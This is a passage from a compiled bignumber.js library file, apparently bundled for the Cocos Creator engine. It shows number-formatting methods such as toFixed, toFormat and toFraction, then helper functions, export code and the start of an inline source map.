    /*
     * Return a string representing the value of this BigNumber in fixed-point notation rounding
     * to dp fixed decimal places using rounding mode rm, or ROUNDING_MODE if rm is omitted.
     *
     * Note: as with JavaScript's number type, (-0).toFixed(0) is '0',
     * but e.g. (-0.00001).toFixed(0) is '-0'.
     *
     * [dp] {number} Decimal places. Integer, 0 to MAX inclusive.
     * [rm] {number} Rounding mode. Integer, 0 to 8 inclusive.
     *
     * '[BigNumber Error] Argument {not a primitive number|not an integer|out of range}: {dp|rm}'
     */


    P.toFixed = function (dp, rm) {
      if (dp != null) {
        intCheck(dp, 0, MAX);
        dp = dp + this.e + 1;
      }

      return format(this, dp, rm);
    };
    /*
     * Return a string representing the value of this BigNumber in fixed-point notation rounded
     * using rm or ROUNDING_MODE to dp decimal places, and formatted according to the properties
     * of the FORMAT object (see BigNumber.set).
     *
     * FORMAT = {
     *      decimalSeparator : '.',
     *      groupSeparator : ',',
     *      groupSize : 3,
     *      secondaryGroupSize : 0,
     *      fractionGroupSeparator : '\xA0',    // non-breaking space
     *      fractionGroupSize : 0
     * };
     *
     * [dp] {number} Decimal places. Integer, 0 to MAX inclusive.
     * [rm] {number} Rounding mode. Integer, 0 to 8 inclusive.
     *
     * '[BigNumber Error] Argument {not a primitive number|not an integer|out of range}: {dp|rm}'
     */


    P.toFormat = function (dp, rm) {
      var str = this.toFixed(dp, rm);

      if (this.c) {
        var i,
            arr = str.split('.'),
            g1 = +FORMAT.groupSize,
            g2 = +FORMAT.secondaryGroupSize,
            groupSeparator = FORMAT.groupSeparator,
            intPart = arr[0],
            fractionPart = arr[1],
            isNeg = this.s < 0,
            intDigits = isNeg ? intPart.slice(1) : intPart,
            len = intDigits.length;
        if (g2) i = g1, g1 = g2, g2 = i, len -= i;

        if (g1 > 0 && len > 0) {
          i = len % g1 || g1;
          intPart = intDigits.substr(0, i);

          for (; i < len; i += g1) {
            intPart += groupSeparator + intDigits.substr(i, g1);
          }

          if (g2 > 0) intPart += groupSeparator + intDigits.slice(i);
          if (isNeg) intPart = '-' + intPart;
        }

        str = fractionPart ? intPart + FORMAT.decimalSeparator + ((g2 = +FORMAT.fractionGroupSize) ? fractionPart.replace(new RegExp('\\d{' + g2 + '}\\B', 'g'), '$&' + FORMAT.fractionGroupSeparator) : fractionPart) : intPart;
      }

      return str;
    };
    /*
     * Return a string array representing the value of this BigNumber as a simple fraction with
     * an integer numerator and an integer denominator. The denominator will be a positive
     * non-zero value less than or equal to the specified maximum denominator. If a maximum
     * denominator is not specified, the denominator will be the lowest value necessary to
     * represent the number exactly.
     *
     * [md] {number|string|BigNumber} Integer >= 1, or Infinity. The maximum denominator.
     *
     * '[BigNumber Error] Argument {not an integer|out of range} : {md}'
     */


    P.toFraction = function (md) {
      var arr,
          d,
          d0,
          d1,
          d2,
          e,
          exp,
          n,
          n0,
          n1,
          q,
          s,
          x = this,
          xc = x.c;

      if (md != null) {
        n = new BigNumber(md); // Throw if md is less than one or is not an integer, unless it is Infinity.

        if (!n.isInteger() && (n.c || n.s !== 1) || n.lt(ONE)) {
          throw Error(bignumberError + 'Argument ' + (n.isInteger() ? 'out of range: ' : 'not an integer: ') + md);
        }
      }

      if (!xc) return x.toString();
      d = new BigNumber(ONE);
      n1 = d0 = new BigNumber(ONE);
      d1 = n0 = new BigNumber(ONE);
      s = coeffToString(xc); // Determine initial denominator.
      // d is a power of 10 and the minimum max denominator that specifies the value exactly.

      e = d.e = s.length - x.e - 1;
      d.c[0] = POWS_TEN[(exp = e % LOG_BASE) < 0 ? LOG_BASE + exp : exp];
      md = !md || n.comparedTo(d) > 0 ? e > 0 ? d : n1 : n;
      exp = MAX_EXP;
      MAX_EXP = 1 / 0;
      n = new BigNumber(s); // n0 = d1 = 0

      n0.c[0] = 0;

      for (;;) {
        q = div(n, d, 0, 1);
        d2 = d0.plus(q.times(d1));
        if (d2.comparedTo(md) == 1) break;
        d0 = d1;
        d1 = d2;
        n1 = n0.plus(q.times(d2 = n1));
        n0 = d2;
        d = n.minus(q.times(d2 = d));
        n = d2;
      }

      d2 = div(md.minus(d0), d1, 0, 1);
      n0 = n0.plus(d2.times(n1));
      d0 = d0.plus(d2.times(d1));
      n0.s = n1.s = x.s;
      e *= 2; // Determine which fraction is closer to x, n0/d0 or n1/d1

      arr = div(n1, d1, e, ROUNDING_MODE).minus(x).abs().comparedTo(div(n0, d0, e, ROUNDING_MODE).minus(x).abs()) < 1 ? [n1.toString(), d1.toString()] : [n0.toString(), d0.toString()];
      MAX_EXP = exp;
      return arr;
    };
    /*
     * Return the value of this BigNumber converted to a number primitive.
     */


    P.toNumber = function () {
      return +this;
    };
    /*
     * Return a string representing the value of this BigNumber rounded to sd significant digits
     * using rounding mode rm or ROUNDING_MODE. If sd is less than the number of digits
     * necessary to represent the integer part of the value in fixed-point notation, then use
     * exponential notation.
     *
     * [sd] {number} Significant digits. Integer, 1 to MAX inclusive.
     * [rm] {number} Rounding mode. Integer, 0 to 8 inclusive.
     *
     * '[BigNumber Error] Argument {not a primitive number|not an integer|out of range}: {sd|rm}'
     */


    P.toPrecision = function (sd, rm) {
      if (sd != null) intCheck(sd, 1, MAX);
      return format(this, sd, rm, 2);
    };
    /*
     * Return a string representing the value of this BigNumber in base b, or base 10 if b is
     * omitted. If a base is specified, including base 10, round according to DECIMAL_PLACES and
     * ROUNDING_MODE. If a base is not specified, and this BigNumber has a positive exponent
     * that is equal to or greater than TO_EXP_POS, or a negative exponent equal to or less than
     * TO_EXP_NEG, return exponential notation.
     *
     * [b] {number} Integer, 2 to ALPHABET.length inclusive.
     *
     * '[BigNumber Error] Base {not a primitive number|not an integer|out of range}: {b}'
     */


    P.toString = function (b) {
      var str,
          n = this,
          s = n.s,
          e = n.e; // Infinity or NaN?

      if (e === null) {
        if (s) {
          str = 'Infinity';
          if (s < 0) str = '-' + str;
        } else {
          str = 'NaN';
        }
      } else {
        str = coeffToString(n.c);

        if (b == null) {
          str = e <= TO_EXP_NEG || e >= TO_EXP_POS ? toExponential(str, e) : toFixedPoint(str, e, '0');
        } else {
          intCheck(b, 2, ALPHABET.length, 'Base');
          str = convertBase(toFixedPoint(str, e, '0'), 10, b, s, true);
        }

        if (s < 0 && n.c[0]) str = '-' + str;
      }

      return str;
    };
    /*
     * Return as toString, but do not accept a base argument, and include the minus sign for
     * negative zero.
     */


    P.valueOf = P.toJSON = function () {
      var str,
          n = this,
          e = n.e;
      if (e === null) return n.toString();
      str = coeffToString(n.c);
      str = e <= TO_EXP_NEG || e >= TO_EXP_POS ? toExponential(str, e) : toFixedPoint(str, e, '0');
      return n.s < 0 ? '-' + str : str;
    };

    P._isBigNumber = true;
    if (configObject != null) BigNumber.set(configObject);
    return BigNumber;
  } // PRIVATE HELPER FUNCTIONS


  function bitFloor(n) {
    var i = n | 0;
    return n > 0 || n === i ? i : i - 1;
  } // Return a coefficient array as a string of base 10 digits.


  function coeffToString(a) {
    var s,
        z,
        i = 1,
        j = a.length,
        r = a[0] + '';

    for (; i < j;) {
      s = a[i++] + '';
      z = LOG_BASE - s.length;

      for (; z--; s = '0' + s) {
        ;
      }

      r += s;
    } // Determine trailing zeros.


    for (j = r.length; r.charCodeAt(--j) === 48;) {
      ;
    }

    return r.slice(0, j + 1 || 1);
  } // Compare the value of BigNumbers x and y.


  function compare(x, y) {
    var a,
        b,
        xc = x.c,
        yc = y.c,
        i = x.s,
        j = y.s,
        k = x.e,
        l = y.e; // Either NaN?

    if (!i || !j) return null;
    a = xc && !xc[0];
    b = yc && !yc[0]; // Either zero?

    if (a || b) return a ? b ? 0 : -j : i; // Signs differ?

    if (i != j) return i;
    a = i < 0;
    b = k == l; // Either Infinity?

    if (!xc || !yc) return b ? 0 : !xc ^ a ? 1 : -1; // Compare exponents.

    if (!b) return k > l ^ a ? 1 : -1;
    j = (k = xc.length) < (l = yc.length) ? k : l; // Compare digit by digit.

    for (i = 0; i < j; i++) {
      if (xc[i] != yc[i]) return xc[i] > yc[i] ^ a ? 1 : -1;
    } // Compare lengths.


    return k == l ? 0 : k > l ^ a ? 1 : -1;
  }
  /*
   * Check that n is a primitive number, an integer, and in range, otherwise throw.
   */


  function intCheck(n, min, max, name) {
    if (n < min || n > max || n !== (n < 0 ? mathceil(n) : mathfloor(n))) {
      throw Error(bignumberError + (name || 'Argument') + (typeof n == 'number' ? n < min || n > max ? ' out of range: ' : ' not an integer: ' : ' not a primitive number: ') + n);
    }
  }

  function isArray(obj) {
    return Object.prototype.toString.call(obj) == '[object Array]';
  } // Assumes finite n.


  function isOdd(n) {
    var k = n.c.length - 1;
    return bitFloor(n.e / LOG_BASE) == k && n.c[k] % 2 != 0;
  }

  function toExponential(str, e) {
    return (str.length > 1 ? str.charAt(0) + '.' + str.slice(1) : str) + (e < 0 ? 'e' : 'e+') + e;
  }

  function toFixedPoint(str, e, z) {
    var len, zs; // Negative exponent?

    if (e < 0) {
      // Prepend zeros.
      for (zs = z + '.'; ++e; zs += z) {
        ;
      }

      str = zs + str; // Positive exponent
    } else {
      len = str.length; // Append zeros.

      if (++e > len) {
        for (zs = z, e -= len; --e; zs += z) {
          ;
        }

        str += zs;
      } else if (e < len) {
        str = str.slice(0, e) + '.' + str.slice(e);
      }
    }

    return str;
  } // EXPORT


  BigNumber = clone();
  BigNumber['default'] = BigNumber.BigNumber = BigNumber; // AMD.

  if (typeof define == 'function' && define.amd) {
    define(function () {
      return BigNumber;
    }); // Node.js and other environments that support module.exports.
  } else if (typeof module != 'undefined' && module.exports) {
    module.exports = BigNumber; // Browser.
  } else {
    if (!globalObject) {
      globalObject = typeof self != 'undefined' && self ? self : window;
    }

    globalObject.BigNumber = BigNumber;
  }
})(void 0);

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9mcmFtZXdvcmsvZXh0ZW5kL2JpZ051bWJlci5qcyJdLCJuYW1lcyI6WyJnbG9iYWxPYmplY3QiLCJCaWdOdW1iZXIiLCJpc051bWVyaWMiLCJtYXRoY2VpbCIsIk1hdGgiLCJjZWlsIiwibWF0aGZsb29yIiwiZmxvb3IiLCJiaWdudW1iZXJFcnJvciIsInRvb01hbnlEaWdpdHMiLCJCQVNFIiwiTE9HX0JBU0UiLCJNQVhfU0FGRV9JTlRFR0VSIiwiUE9XU19URU4iLCJTUVJUX0JBU0UiLCJNQVgiLCJjbG9uZSIsImNvbmZpZ09iamVjdCIsImRpdiIsImNvbnZlcnRCYXNlIiwicGFyc2VOdW1lcmljIiwiUCIsInByb3RvdHlwZSIsImNvbnN0cnVjdG9yIiwidG9TdHJpbmciLCJ2YWx1ZU9mIiwiT05FIiwiREVDSU1BTF9QTEFDRVMiLCJST1VORElOR19NT0RFIiwiVE9fRVhQX05FRyIsIlRPX0VYUF9QT1MiLCJNSU5fRVhQIiwiTUFYX0VYUCIsIkNSWVBUTyIsIk1PRFVMT19NT0RFIiwiUE9XX1BSRUNJU0lPTiIsIkZPUk1BVCIsImRlY2ltYWxTZXBhcmF0b3IiLCJncm91cFNlcGFyYXRvciIsImdyb3VwU2l6ZSIsInNlY29uZGFyeUdyb3VwU2l6ZSIsImZyYWN0aW9uR3JvdXBTZXBhcmF0b3IiLCJmcmFjdGlvbkdyb3VwU2l6ZSIsIkFMUEhBQkVUIiwibiIsImIiLCJhbHBoYWJldCIsImMiLCJjYXNlQ2hhbmdlZCIsImUiLCJpIiwiaXNOdW0iLCJsZW4iLCJzdHIiLCJ4IiwicyIsInNsaWNlIiwidGVzdCIsImNoYXJDb2RlQXQiLCJpbmRleE9mIiwicmVwbGFjZSIsInNlYXJjaCIsInN1YnN0cmluZyIsImxlbmd0aCIsImludENoZWNrIiwicm91bmQiLCJERUJVRyIsIkVycm9yIiwiY2hhckF0IiwidG9VcHBlckNhc2UiLCJ0b0xvd2VyQ2FzZSIsInB1c2giLCJST1VORF9VUCIsIlJPVU5EX0RPV04iLCJST1VORF9DRUlMIiwiUk9VTkRfRkxPT1IiLCJST1VORF9IQUxGX1VQIiwiUk9VTkRfSEFMRl9ET1dOIiwiUk9VTkRfSEFMRl9FVkVOIiwiUk9VTkRfSEFMRl9DRUlMIiwiUk9VTkRfSEFMRl9GTE9PUiIsIkVVQ0xJRCIsImNvbmZpZyIsInNldCIsIm9iaiIsInAiLCJ2IiwiaGFzT3duUHJvcGVydHkiLCJpc0FycmF5IiwiY3J5cHRvIiwiZ2V0UmFuZG9tVmFsdWVzIiwicmFuZG9tQnl0ZXMiLCJFWFBPTkVOVElBTF9BVCIsIlJBTkdFIiwiaXNCaWdOdW1iZXIiLCJfaXNCaWdOdW1iZXIiLCJtYXhpbXVtIiwibWF4IiwibWF4T3JNaW4iLCJhcmd1bWVudHMiLCJsdCIsIm1pbmltdW0iLCJtaW4iLCJndCIsInJhbmRvbSIsInBvdzJfNTMiLCJyYW5kb201M2JpdEludCIsImRwIiwiYSIsImsiLCJyYW5kIiwiVWludDMyQXJyYXkiLCJjb3B5IiwicG9wIiwic3BsaWNlIiwiZGVjaW1hbCIsInRvQmFzZU91dCIsImJhc2VJbiIsImJhc2VPdXQiLCJqIiwiYXJyIiwiYXJyTCIsInJldmVyc2UiLCJzaWduIiwiY2FsbGVySXNUb1N0cmluZyIsImQiLCJyIiwieGMiLCJ5Iiwicm0iLCJwb3ciLCJ0b0ZpeGVkUG9pbnQiLCJjb2VmZlRvU3RyaW5nIiwiY29uY2F0IiwibXVsdGlwbHkiLCJiYXNlIiwibSIsInRlbXAiLCJ4bG8iLCJ4aGkiLCJjYXJyeSIsImtsbyIsImtoaSIsImNvbXBhcmUiLCJhTCIsImJMIiwiY21wIiwic3VidHJhY3QiLCJtb3JlIiwicHJvZCIsInByb2RMIiwicSIsInFjIiwicmVtIiwicmVtTCIsInJlbTAiLCJ4aSIsInhMIiwieWMwIiwieUwiLCJ5eiIsInljIiwiTmFOIiwiYml0Rmxvb3IiLCJmb3JtYXQiLCJpZCIsImMwIiwibmUiLCJ0b0V4cG9uZW50aWFsIiwiYXJncyIsIm1ldGhvZCIsImNhbGwiLCJub3JtYWxpc2UiLCJiYXNlUHJlZml4IiwiZG90QWZ0ZXIiLCJkb3RCZWZvcmUiLCJpc0luZmluaXR5T3JOYU4iLCJ3aGl0ZXNwYWNlT3JQbHVzIiwiaXNOYU4iLCJwMSIsInAyIiwic2QiLCJuaSIsInJkIiwicG93czEwIiwib3V0IiwiYWJzb2x1dGVWYWx1ZSIsImFicyIsImNvbXBhcmVkVG8iLCJkZWNpbWFsUGxhY2VzIiwiZGl2aWRlZEJ5IiwiZGl2aWRlZFRvSW50ZWdlckJ5IiwiaWRpdiIsImV4cG9uZW50aWF0ZWRCeSIsImhhbGYiLCJpc01vZEV4cCIsIm5Jc0JpZyIsIm5Jc05lZyIsIm5Jc09kZCIsImlzSW50ZWdlciIsImlzT2RkIiwibW9kIiwidGltZXMiLCJpbnRlZ2VyVmFsdWUiLCJpc0VxdWFsVG8iLCJlcSIsImlzRmluaXRlIiwiaXNHcmVhdGVyVGhhbiIsImlzR3JlYXRlclRoYW5PckVxdWFsVG8iLCJndGUiLCJpc0xlc3NUaGFuIiwiaXNMZXNzVGhhbk9yRXF1YWxUbyIsImx0ZSIsImlzTmVnYXRpdmUiLCJpc1Bvc2l0aXZlIiwiaXNaZXJvIiwibWludXMiLCJ0IiwieExUeSIsInBsdXMiLCJ4ZSIsInllIiwibW9kdWxvIiwibXVsdGlwbGllZEJ5IiwieGNMIiwieWNMIiwieWxvIiwieWhpIiwiemMiLCJzcXJ0QmFzZSIsIm5lZ2F0ZWQiLCJwcmVjaXNpb24iLCJzaGlmdGVkQnkiLCJzcXVhcmVSb290Iiwic3FydCIsInJlcCIsInRvRml4ZWQiLCJ0b0Zvcm1hdCIsInNwbGl0IiwiZzEiLCJnMiIsImludFBhcnQiLCJmcmFjdGlvblBhcnQiLCJpc05lZyIsImludERpZ2l0cyIsInN1YnN0ciIsIlJlZ0V4cCIsInRvRnJhY3Rpb24iLCJtZCIsImQwIiwiZDEiLCJkMiIsImV4cCIsIm4wIiwibjEiLCJ0b051bWJlciIsInRvUHJlY2lzaW9uIiwidG9KU09OIiwieiIsImwiLCJuYW1lIiwiT2JqZWN0IiwienMiLCJkZWZpbmUiLCJhbWQiLCJtb2R1bGUiLCJleHBvcnRzIiwic2VsZiIsIndpbmRvdyJdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7Ozs7QUFDQTs7QUFBQyxDQUFDLFVBQVVBLFlBQVYs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